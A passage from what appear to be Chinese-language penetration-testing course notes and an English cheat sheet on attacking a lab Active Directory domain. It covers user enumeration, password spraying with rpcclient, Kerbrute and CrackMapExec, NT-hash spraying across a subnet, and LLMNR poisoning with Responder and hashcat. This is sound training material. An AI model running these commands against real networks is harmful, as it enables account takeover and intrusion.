帐户被锁定30分钟</p><p>此密码策略非常适合密码喷洒。八个字符的最小值意味着我们可以尝试常见的弱密码，如Welcome1。5的锁定阈值意味着我们可以每31分钟尝试2-3次（为了安全）喷雾，而没有锁定任何账户的风险。如果一个帐户被锁定，它将在30分钟后自动解锁（无需管理员手动干预），但我们应该避免不惜一切代价锁定任何帐户。 PowerView在这方面也很方便：</p><h4 id="Using-PowerView"><a href="#Using-PowerView" class="headerlink" title="Using PowerView"></a>Using PowerView</h4><pre><code class="powershell-session">PS C:\htb&gt; import-module .\PowerView.ps1PS C:\htb&gt; Get-DomainPolicyUnicode        : @&#123;Unicode=yes&#125;SystemAccess   : @&#123;MinimumPasswordAge=1; MaximumPasswordAge=-1; MinimumPasswordLength=8; PasswordComplexity=1;                 PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30;                 RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0; ClearTextPassword=0;                 LSAAnonymousNameLookup=0&#125;KerberosPolicy : @&#123;MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1&#125;Version        : @&#123;signature=&quot;$CHICAGO$&quot;; Revision=1&#125;RegistryValues : @&#123;MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]&#125;Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHI                 NE\Microsoft\Windows NT\SecEdit\GptTmpl.infGPOName        : &#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;GPODisplayName : Default Domain Policy</code></pre><p>PowerView为我们提供了与net accounts命令相同的输出，只是格式不同，但也显示密码复杂性已启用（PasswordComplexity&#x3D;1）。 与Linux一样，我们有许多工具可以在Windows系统上检索密码策略，无论是我们的攻击系统还是客户端提供的系统。PowerView&#x2F;SharpView总是不错的选择，CrackMapExec、SharpMapExec等也是如此。工具的选择取决于评估目标、隐形注意事项、任何防病毒或EDR以及对目标主机的其他潜在限制。让我们介绍几个例子。</p><h2 id="Analyzing-the-Password-Policy"><a href="#Analyzing-the-Password-Policy" class="headerlink" title="Analyzing the Password Policy"></a>Analyzing the Password Policy</h2><p>我们现在已经通过多种方式取消了密码策略。让我们逐一了解INLANEFREIGHT.LOCAL域的策略。</p><ul><li>最小密码长度为8（8很常见，但如今，我们看到越来越多的组织强制使用10-14个字符的密码，这可以为我们删除一些密码选项，但并不能完全缓解密码喷洒矢量）</li><li>帐户锁定阈值为5（通常会看到较低的阈值，如3，甚至根本没有设置锁定阈值）</li><li>锁定持续时间为30分钟（根据组织的不同，这可能会更高或更低），因此，如果我们意外锁定（避免！！）帐户，它将在30分钟窗口过后解锁</li><li>帐户自动解锁（在某些组织中，管理员必须手动解锁帐户）。我们从不想在执行密码喷洒时锁定帐户，但我们特别希望避免在管理员必须手动&#x2F;脚本干预并解锁数百（或数千）个帐户的组织中锁定帐户</li><li>启用了密码复杂性，这意味着用户必须选择包含以下内容的3&#x2F;4的密码：大写字母、小写字母、数字、特殊字符（Password1或Welcome1可以满足此处的“复杂性”要求，但显然仍然是弱密码）。</li></ul><h1 id="default-password-policy"><a href="#default-password-policy" class="headerlink" title="default password policy*"></a>default password policy*</h1><p>创建新域时的默认密码策略如下，许多组织从未更改过此策略：</p><table><thead><tr><th>Policy</th><th>Default Value</th></tr></thead><tbody><tr><td>Enforce password history</td><td>24 days</td></tr><tr><td>Maximum password age</td><td>42 days</td></tr><tr><td>Minimum password age</td><td>1 day</td></tr><tr><td>Minimum password length</td><td>7</td></tr><tr><td>Password must meet complexity requirements</td><td>Enabled</td></tr><tr><td>Store passwords using reversible encryption</td><td>Disabled</td></tr><tr><td>Account lockout duration</td><td>Not set</td></tr><tr><td>Account lockout threshold</td><td>0</td></tr><tr><td>Reset account lockout counter after</td><td>Not set</td></tr></tbody></table><hr><h1 id="Password-Spraying-Making-a-Target-User-List"><a href="#Password-Spraying-Making-a-Target-User-List" class="headerlink" title="-Password Spraying - Making a Target User List-"></a>-Password Spraying - Making a Target User List-</h1><h2 id="SMB-NULL-Session-to-Pull-User-List"><a href="#SMB-NULL-Session-to-Pull-User-List" class="headerlink" title="SMB NULL Session to Pull User List"></a>SMB NULL Session to Pull User List</h2><p>一些可以利用SMB NULL会话和LDAP匿名绑定的工具包括enum4linux、rpcclient和CrackMapExec等。不管使用什么工具，我们都必须进行一些过滤来清理输出，并获得一个仅包含用户名的列表，每行一个。我们可以使用带有-U标志的enum4linux来实现这一点。</p><pre><code class="shell-session">Tanin@htb[/htb]$ enum4linux -U 172.16.5.5  | grep &quot;user:&quot; | cut -f2 -d&quot;[&quot; | cut -f1 -d&quot;]&quot;administratorguestkrbtgtlab_admhtb-studentavazquezpfalconfanthonywdillardlbradfordsgageasanchezdbranchccruznjohnsonmholliday&lt;SNIP&gt;</code></pre><p>使用rpcclient匿名连接后，我们可以使用enumdomusers命令。</p><pre><code class="shell-session">Tanin@htb[/htb]$ rpcclient -U &quot;&quot; -N 172.16.5.5rpcclient $&gt; enumdomusers user:[administrator] rid:[0x1f4]user:[guest] rid:[0x1f5]user:[krbtgt] rid:[0x1f6]user:[lab_adm] rid:[0x3e9]user:[htb-student] rid:[0x457]user:[avazquez] rid:[0x458]&lt;SNIP&gt;</code></pre><p>最后，我们可以使用带有–users标志的CrackMapExec。这是一个有用的工具，它还将显示badpwdcount（无效登录尝试），因此我们可以从列表中删除任何接近锁定阈值的帐户。它还显示了baddpwdtime，这是最后一次错误密码尝试的日期和时间，因此我们可以看到一个帐户距离重置其badpwdcount有多近。在具有多个域控制器的环境中，此值在每个域控制器上单独维护。要获得帐户错误密码尝试的准确总数，我们必须查询每个域控制器并使用值的总和，或者查询具有PDC Emulator FSMO角色的域控制器。</p><h4 id="Using-CrackMapExec-–users-Flag"><a href="#Using-CrackMapExec-–users-Flag" class="headerlink" title="Using CrackMapExec –users Flag"></a>Using CrackMapExec –users Flag</h4><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 172.16.5.5 --usersSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-01-10 13:23:09.463228SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2021-12-21 14:10:56.859064SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-02-22 14:48:26.653366SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez    </code></pre><h2 id="Gathering-Users-with-LDAP-Anonymous"><a href="#Gathering-Users-with-LDAP-Anonymous" class="headerlink" title="Gathering Users with LDAP Anonymous"></a>Gathering Users with LDAP Anonymous</h2><p>当我们发现LDAP匿名绑定时，我们可以使用各种工具来收集用户。一些例子包括 <a href="https://github.com/ropnop/windapsearch">windapsearch</a>和<a href="https://linux.die.net/man/1/ldapsearch">ldapsearch</a>。</p><h4 id="Using-ldapsearch-1"><a href="#Using-ldapsearch-1" class="headerlink" title="Using ldapsearch"></a>Using ldapsearch</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b &quot;DC=INLANEFREIGHT,DC=LOCAL&quot; -s sub &quot;(&amp;(objectclass=user))&quot;  | grep sAMAccountName: | cut -f2 -d&quot; &quot;</code></pre><p>像windapsearch这样的工具使这变得更容易（尽管我们仍然应该了解如何创建自己的LDAP搜索过滤器）。在这里，我们可以通过提供一个带有-u标志和-u标志的空白用户名来指定匿名访问，以告诉工具只检索用户。</p><pre><code class="shell-session">Tanin@htb[/htb]$ ./windapsearch.py --dc-ip 172.16.5.5 -u &quot;&quot; -U</code></pre><h2 id="Enumerating-Users-with-Kerbrute"><a href="#Enumerating-Users-with-Kerbrute" class="headerlink" title="Enumerating Users with Kerbrute"></a>Enumerating Users with Kerbrute</h2><p>如域的初始枚举部分所述，如果我们在内部网络中的位置根本无法访问，我们可以使用Kerbrute枚举有效的AD帐户并进行密码喷洒。 该工具使用Kerberos预身份验证，这是一种更快且可能更隐蔽的执行密码喷洒的方法。此方法不生成Windows事件ID 4625:帐户登录失败，或登录失败（经常受到监视）。该工具在没有Kerberos预身份验证的情况下向域控制器发送TGT请求，以执行用户名枚举。如果KDC以错误PRINCIPAL UNKNOWN进行响应，则用户名无效。每当KDC提示进行Kerberos预身份验证时，这表示用户名存在，工具会将其标记为有效。此用户名枚举方法不会导致登录失败，也不会锁定帐户。然而，一旦我们有了有效用户的列表并切换设备来使用此工具进行密码喷洒，失败的Kerberos预身份验证尝试将计入帐户的失败登录帐户，并可能导致帐户锁定，因此无论选择何种方法，我们都必须小心。 让我们使用格式为flast的包含48705个可能的常见用户名的jsmith.txt单词列表来尝试这种方法。统计上可能的用户名GitHub repo是此类攻击的绝佳资源，它包含各种不同的用户名列表，我们可以使用Kerbrute来枚举有效用户名。</p><pre><code class="shell-session">Tanin@htb[/htb]$  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt </code></pre><p>我们在12秒内检查了48000多个用户名，发现了50多个有效用户名。使用Ker暴力进行用户名枚举将生成事件ID 4768:请求了Kerberos身份验证票证（TGT）。只有通过组策略启用Kerberos事件日志记录时，才会触发此操作。防御者可以调整他们的SIEM工具，以寻找该事件ID的涌入，这可能表明发生了攻击。如果我们在渗透测试中成功地使用了这种方法，这将是一个很好的建议，可以添加到我们的报告中。 如果我们无法使用上面强调的任何方法创建有效的用户名列表，我们可以返回外部信息收集和搜索公司电子邮件地址，或者使用linkedin2username等工具从公司的LinkedIn页面中混合可能的用户名。</p><h2 id="Credentialed-Enumeration-to-Build-our-User-List"><a href="#Credentialed-Enumeration-to-Build-our-User-List" class="headerlink" title="Credentialed Enumeration to Build our User List"></a>Credentialed Enumeration to Build our User List</h2><p>有了有效的凭据，我们可以使用前面介绍的任何工具来构建用户列表。一种快速简单的方法是使用CrackMapExec。</p><h4 id="Using-CrackMapExec-with-Valid-Credentials"><a href="#Using-CrackMapExec-with-Valid-Credentials" class="headerlink" title="Using CrackMapExec with Valid Credentials"></a>Using CrackMapExec with Valid Credentials</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users</code></pre><h1 id="Spray-Responsibly"><a href="#Spray-Responsibly" class="headerlink" title="-Spray Responsibly-"></a>-Spray Responsibly-</h1><h4 id="Using-a-Bash-one-liner-for-the-Attack"><a href="#Using-a-Bash-one-liner-for-the-Attack" class="headerlink" title="Using a Bash one-liner for the Attack"></a>Using a Bash one-liner for the Attack</h4><pre><code class="shell-session">for u in $(cat valid_users.txt);do rpcclient -U &quot;$u%Welcome1&quot; -c &quot;getusername;quit&quot; 172.16.5.5 | grep Authority; done</code></pre><blockquote><ul><li><code>rpcclient</code>: 这是一个用于与远程主机上的 RPC（远程过程调用）服务进行交互的命令行工具。</li><li><code>-U &quot;$u%Welcome1&quot;</code>: 这部分指定了身份验证信息。<code>-U</code> 标志后面的参数包括用户名和密码。<code>$u</code> 可能是一个变量，用于存储用户名。<code>%</code> 是分隔用户名和密码的符号，然后是实际的密码 <code>Welcome1</code>。这个参数用于进行身份验证，让你能够登录到目标系统。</li><li><code>-c &quot;getusername;quit&quot;</code>: 这部分指定了在与远程主机建立连接后要执行的命令。首先，它执行了 <code>getusername</code> 命令，然后执行 <code>quit</code> 命令以退出 <code>rpcclient</code>。</li><li><code>172.16.5.5</code>: 这是远程主机的IP地址，是你要连接到的目标主机。</li></ul></blockquote><h4 id="Using-Kerbrute-for-the-Attack"><a href="#Using-Kerbrute-for-the-Attack" class="headerlink" title="Using Kerbrute for the Attack"></a>Using Kerbrute for the Attack</h4><pre><code class="shell-session">Tanin@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1    </code></pre><p>从Linux执行密码喷洒还有多种其他方法。另一个不错的选择是使用CrackMapExec。这个通用工具接受一个用户名文本文件，在喷射攻击中使用单个密码运行。在这里，我们用grep for+过滤登录失败，并只关注有效的登录尝试，以确保滚动多行输出不会错过任何内容。</p><h4 id="Using-CrackMapExec-amp-Filtering-Logon-Failures"><a href="#Using-CrackMapExec-amp-Filtering-Logon-Failures" class="headerlink" title="Using CrackMapExec &amp; Filtering Logon Failures"></a>Using CrackMapExec &amp; Filtering Logon Failures</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 </code></pre><p>在我们的密码喷洒攻击命中一次（或多次！）后，我们可以使用CrackMapExec针对域控制器快速验证凭据。</p><h4 id="Validating-the-Credentials-with-CrackMapExec"><a href="#Validating-the-Credentials-with-CrackMapExec" class="headerlink" title="Validating the Credentials with CrackMapExec"></a>Validating the Credentials with CrackMapExec</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123</code></pre><h2 id="Local-Administrator-Password-Reuse"><a href="#Local-Administrator-Password-Reuse" class="headerlink" title="Local Administrator Password Reuse"></a>Local Administrator Password Reuse</h2><p>如果您获得本地管理员帐户（或另一个具有特权的本地帐户）的管理访问权限和NTLM密码哈希或明文密码，则可以在网络中的多个主机上进行尝试。由于在自动化部署中使用了黄金映像，并且通过在多个主机上强制执行相同的密码可以轻松管理，因此本地管理员帐户密码的重复使用非常普遍。 CrackMapExec是尝试此攻击的方便工具。值得将目标锁定在SQL或Microsoft Exchange服务器等高价值主机上，因为它们更有可能让高特权用户登录或将其凭据永久保存在内存中。 使用本地管理员帐户时，需要考虑的一个问题是跨帐户重复使用密码或常见的密码格式。如果我们发现本地管理员帐户密码设置为唯一的桌面主机，例如$desktop%@admin123，则可能值得对服务器尝试$server%@admin123。此外，如果我们找到非标准的本地管理员帐户（如bsmith），我们可能会发现密码被重复用于类似名称的域用户帐户。同样的原则也适用于域帐户。如果我们检索名为ajones的用户的密码，那么值得在他们的管理帐户上尝试相同的密码（如果用户有），例如ajones_adm，看看他们是否在重复使用自己的密码。这在域信任情况下也很常见。我们可以获得域a中用户的有效凭据，该凭据对域B中用户名相同或相似的用户有效，反之亦然。 有时，我们可能只从本地SAM数据库中检索本地管理员帐户的NTLM哈希。在这些情况下，我们可以在整个子网（或多个子网）中喷洒NT哈希，以查找具有相同密码集的本地管理员帐户。在下面的示例中，我们尝试使用从另一台机器检索到的内置本地管理员帐户NT哈希来对&#x2F;23网络中的所有主机进行身份验证。–local auth标志将告诉该工具在每台机器上只尝试登录一次，这将消除帐户锁定的任何风险。请确保设置了此标志，这样我们就不会锁定域的内置管理员。默认情况下，如果未设置本地身份验证选项，该工具将尝试使用当前域进行身份验证，这可能会迅速导致帐户锁定。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
            <tag> AD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AD_Cheat_Sheet</title>
      <link href="/2023/09/23/AD-Cheat-Sheet/"/>
      <url>/2023/09/23/AD-Cheat-Sheet/</url>
      
        <content type="html"><![CDATA[<h1 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>nslookup ns1.inlanefreight.com</code></td><td>Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host.</td></tr><tr><td><code>sudo tcpdump -i ens224</code></td><td>Used to start capturing network packets on the network interface proceeding the <code>-i</code> option a Linux-based host.</td></tr><tr><td><code>sudo responder -I ens224 -A</code></td><td>Used to start responding to &amp; analyzing <code>LLMNR</code>, <code>NBT-NS</code> and <code>MDNS</code> queries on the interface specified proceeding the<code> -I</code> option and operating in <code>Passive Analysis</code> mode which is activated using <code>-A</code>. Performed from a Linux-based host</td></tr><tr><td><code>fping -asgq 172.16.5.0/23</code></td><td>Performs a ping sweep on the specified network segment from a Linux-based host.</td></tr><tr><td><code>sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum</code></td><td>Performs an nmap scan that with OS detection, version detection, script scanning, and traceroute enabled (<code>-A</code>) based on a list of hosts (<code>hosts.txt</code>) specified in the file proceeding <code>-iL</code>. Then outputs the scan results to the file specified after the <code>-oN</code>option. Performed from a Linux-based host</td></tr><tr><td><code>sudo git clone https://github.com/ropnop/kerbrute.git</code></td><td>Uses <code>git</code> to clone the kerbrute tool from a Linux-based host.</td></tr><tr><td><code>make help</code></td><td>Used to list compiling options that are possible with <code>make</code> from a Linux-based host.</td></tr><tr><td><code>sudo make all</code></td><td>Used to compile a <code>Kerbrute</code> binary for multiple OS platforms and CPU architectures.</td></tr><tr><td><code>./kerbrute_linux_amd64</code></td><td>Used to test the chosen complied <code>Kebrute</code> binary from a Linux-based host.</td></tr><tr><td><code>sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute</code></td><td>Used to move the <code>Kerbrute</code> binary to a directory can be set to be in a Linux user’s path. Making it easier to use the tool.</td></tr><tr><td><code>./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results</code></td><td>Runs the Kerbrute tool to discover usernames in the domain (<code>INLANEFREIGHT.LOCAL</code>) specified proceeding the <code>-d</code> option and the associated domain controller specified proceeding <code>--dc</code>using a wordlist and outputs (<code>-o</code>) the results to a specified file. Performed from a Linux-based host.</td></tr></tbody></table><h1 id="LLMNR-x2F-NTB-NS-Poisoning"><a href="#LLMNR-x2F-NTB-NS-Poisoning" class="headerlink" title="LLMNR&#x2F;NTB-NS Poisoning"></a>LLMNR&#x2F;NTB-NS Poisoning</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>responder -h</code></td><td>Used to display the usage instructions and various options available in <code>Responder</code> from a Linux-based host.</td></tr><tr><td><code>hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt</code></td><td>Uses <code>hashcat</code> to crack <code>NTLMv2</code> (<code>-m</code>) hashes that were captured by responder and saved in a file (<code>frond_ntlmv2</code>). The cracking is done based on a specified wordlist.</td></tr><tr><td><code>Import-Module .\Inveigh.ps1</code></td><td>Using the <code>Import-Module</code> PowerShell cmd-let to import the Windows-based tool <code>Inveigh.ps1</code>.</td></tr><tr><td><code>(Get-Command Invoke-Inveigh).Parameters</code></td><td>Used to output many of the options &amp; functionality available with <code>Invoke-Inveigh</code>. Peformed from a Windows-based host.</td></tr><tr><td><code>Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y</code></td><td>Starts <code>Inveigh</code> on a Windows-based host with LLMNR &amp; NBNS spoofing enabled and outputs the results to a file.</td></tr><tr><td><code>.\Inveigh.exe</code></td><td>Starts the <code>C#</code> implementation of <code>Inveigh</code> from a Windows-based host.</td></tr><tr><td><code>$regkey = &quot;HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces&quot; Get-ChildItem $regkey |foreach &#123; Set-ItemProperty -Path &quot;$regkey\$($_.pschildname)&quot; -Name NetbiosOptions -Value 2 -Verbose&#125;</code></td><td>PowerShell script used to disable NBT-NS on a Windows host.</td></tr></tbody></table><h1 id="Password-Spraying-amp-Password-Policies"><a href="#Password-Spraying-amp-Password-Policies" class="headerlink" title="Password Spraying &amp; Password Policies"></a>Password Spraying &amp; Password Policies</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>#!/bin/bash  for x in &#123;&#123;A..Z&#125;,&#123;0..9&#125;&#125;&#123;&#123;A..Z&#125;,&#123;0..9&#125;&#125;&#123;&#123;A..Z&#125;,&#123;0..9&#125;&#125;&#123;&#123;A..Z&#125;,&#123;0..9&#125;&#125;     do echo $x; done</code></td><td>Bash script used to generate <code>16,079,616</code> possible username combinations from a Linux-based host.</td></tr><tr><td><code>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol</code></td><td>Uses <code>CrackMapExec</code>and valid credentials (<code>avazquez:Password123</code>) to enumerate the password policy (<code>--pass-pol</code>) from a Linux-based host.</td></tr><tr><td><code>rpcclient -U &quot;&quot; -N 172.16.5.5</code></td><td>Uses <code>rpcclient</code> to discover information about the domain through <code>SMB NULL</code> sessions. Performed from a Linux-based host.</td></tr><tr><td><code>rpcclient $&gt; querydominfo</code></td><td>Uses <code>rpcclient</code> to enumerate the password policy in a target Windows domain from a Linux-based host.</td></tr><tr><td><code>enum4linux  -P 172.16.5.5</code></td><td>Uses <code>enum4linux</code> to enumerate the password policy (<code>-P</code>) in a target Windows domain from a Linux-based host.</td></tr><tr><td><code>enum4linux-ng -P 172.16.5.5 -oA ilfreight</code></td><td>Uses <code>enum4linux-ng</code> to enumerate the password policy (<code>-P</code>) in a target Windows domain from a Linux-based host, then presents the output in YAML &amp; JSON saved in a file proceeding the <code>-oA</code> option.</td></tr><tr><td><code>ldapsearch -h 172.16.5.5 -x -b &quot;DC=INLANEFREIGHT,DC=LOCAL&quot; -s sub &quot;*&quot; | grep -m 1 -B 10 pwdHistoryLength</code></td><td>Uses <code>ldapsearch</code> to enumerate the password policy in a  target Windows domain from a Linux-based host.</td></tr><tr><td><code>net accounts</code></td><td>Used to enumerate the password policy in a Windows domain from a Windows-based host.</td></tr><tr><td><code>Import-Module .\PowerView.ps1</code></td><td>Uses the Import-Module cmd-let to import the <code>PowerView.ps1</code> tool from a Windows-based host.</td></tr><tr><td><code>Get-DomainPolicy</code></td><td>Used to enumerate the password policy in a target Windows domain from a Windows-based host.</td></tr><tr><td><code>enum4linux -U 172.16.5.5  | grep &quot;user:&quot; | cut -f2 -d&quot;[&quot; | cut -f1 -d&quot;]&quot;</code></td><td>Uses <code>enum4linux</code> to discover user accounts in a target Windows domain, then leverages <code>grep</code> to filter the output to just display the user from a Linux-based host.</td></tr><tr><td><code>rpcclient -U &quot;&quot; -N 172.16.5.5  rpcclient $&gt; enumdomuser</code></td><td>Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host.</td></tr><tr><td><code>crackmapexec smb 172.16.5.5 --users</code></td><td>Uses <code>CrackMapExec</code> to discover users (<code>--users</code>) in a target Windows domain from a Linux-based host.</td></tr><tr><td><code>ldapsearch -h 172.16.5.5 -x -b &quot;DC=INLANEFREIGHT,DC=LOCAL&quot; -s sub &quot;(&amp;(objectclass=user))&quot;  | grep sAMAccountName: | cut -f2 -d&quot; &quot;</code></td><td>Uses <code>ldapsearch</code> to discover users in a target Windows doman, then filters the output using <code>grep</code> to show only the <code>sAMAccountName</code> from a Linux-based host.</td></tr><tr><td><code>./windapsearch.py --dc-ip 172.16.5.5 -u &quot;&quot; -U</code></td><td>Uses the python tool <code>windapsearch.py</code> to discover users in a target Windows domain from a Linux-based host.</td></tr><tr><td><code>for u in $(cat valid_users.txt);do rpcclient -U &quot;$u%Welcome1&quot; -c &quot;getusername;quit&quot; 172.16.5.5 | grep Authority; done</code></td><td>Bash one-liner used to perform a password spraying attack using <code>rpcclient</code> and a list of users (<code>valid_users.txt</code>) from a Linux-based host. It also filters out failed attempts to make the output cleaner.</td></tr><tr><td><code>kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1</code></td><td>Uses <code>kerbrute</code> and a list of users (<code>valid_users.txt</code>) to perform a password spraying attack against a target Windows domain from a Linux-based host.</td></tr><tr><td><code>sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +</code></td><td>Uses <code>CrackMapExec</code> and a list of users (<code>valid_users.txt</code>) to perform a password spraying attack against a target Windows domain from a Linux-based host. It also filters out logon failures using <code>grep</code>.</td></tr><tr><td><code> sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123</code></td><td>Uses <code>CrackMapExec</code> to validate a set of credentials from a Linux-based host.</td></tr><tr><td><code>sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +</code></td><td>Uses <code>CrackMapExec</code> and the -<code>-local-auth</code> flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using <code>grep</code>.</td></tr><tr><td><code>Import-Module .\DomainPasswordSpray.ps1</code></td><td>Used to import the PowerShell-based tool <code>DomainPasswordSpray.ps1</code> from a Windows-based host.</td></tr><tr><td><code>Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue</code></td><td>Performs a password spraying attack and outputs (-OutFile) the results to a specified file (<code>spray_success</code>) from a Windows-based host.</td></tr></tbody></table><h1 id="Enumerating-Security-Controls"><a href="#Enumerating-Security-Controls" class="headerlink" title="Enumerating Security Controls"></a>Enumerating Security Controls</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-MpComputerStatus</code></td><td>PowerShell cmd-let used to check the status of <code>Windows Defender Anti-Virus</code> from a Windows-based host.</td></tr><tr><td><code>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</code></td><td>PowerShell cmd-let used to view <code>AppLocker</code> policies from a Windows-based host.</td></tr><tr><td><code>$ExecutionContext.SessionState.LanguageMode</code></td><td>PowerShell script used to discover the <code>PowerShell Language Mode</code> being used on a Windows-based host. Performed from a Windows-based host.</td></tr><tr><td><code>Find-LAPSDelegatedGroups</code></td><td>A <code>LAPSToolkit</code> function that discovers <code>LAPS Delegated Groups</code> from a Windows-based host.</td></tr><tr><td><code>Find-AdmPwdExtendedRights</code></td><td>A <code>LAPSTookit</code> function that checks the rights on each computer with LAPS enabled for any groups with read access and users with <code>All Extended Rights</code>. Performed from a Windows-based host.</td></tr><tr><td><code>Get-LAPSComputers</code></td><td>A <code>LAPSToolkit</code> function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host.</td></tr></tbody></table><h1 id="Credentialed-Enumeration"><a href="#Credentialed-Enumeration" class="headerlink" title="Credentialed Enumeration"></a>Credentialed Enumeration</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25</code></td><td>Connects to a Windows target using valid credentials. Performed from a Linux-based host.</td></tr><tr><td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users</code></td><td>Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover more users (<code>--users</code>) in a target Windows domain. Performed from a Linux-based host.</td></tr><tr><td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups</code></td><td>Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover groups (<code>--groups</code>) in a target Windows domain. Performed from a Linux-based host.</td></tr><tr><td><code>sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users</code></td><td>Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to check for a list of logged on users (<code>--loggedon-users</code>) on the target Windows host. Performed from a Linux-based host.</td></tr><tr><td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares</code></td><td>Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover any smb shares (<code>--shares</code>). Performed from a Linux-based host.</td></tr><tr><td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share</code></td><td>Authenticates with a Windows target over <code>smb</code> using valid credentials and utilizes the CrackMapExec module (<code>-M</code>) <code>spider_plus</code> to go through each readable share (<code>Dev-share</code>) and list all readable files.  The results are outputted in <code>JSON</code>. Performed from a Linux-based host.</td></tr><tr><td><code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5</code></td><td>Enumerates the target Windows domain using valid credentials and lists shares &amp; permissions available on each within the context of the valid credentials used and the target Windows host (<code>-H</code>). Performed from a Linux-based host.</td></tr><tr><td><code>smbmap -u forend -p Klmcargo2 